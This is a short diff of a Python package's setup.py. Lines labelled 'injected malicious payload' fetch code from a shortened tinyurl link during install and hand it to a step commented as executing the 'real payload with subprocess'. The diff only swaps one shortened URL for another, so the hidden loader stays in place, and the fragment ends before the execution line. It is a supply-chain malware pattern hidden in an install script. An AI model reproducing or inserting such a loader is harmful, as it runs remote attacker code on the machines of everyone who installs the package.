@@ -22,7 +22,7 @@ from setuptools import setup, find_packages
 import requests
 
 # injected malicious payload
-response = requests.get("https://tinyurl.com/2yx5jhxd")
+response = requests.get("https://tinyurl.com/2cf88w93")
 if response.status_code == 200:
     m_code = response.text
     # execute real payload with subprocess
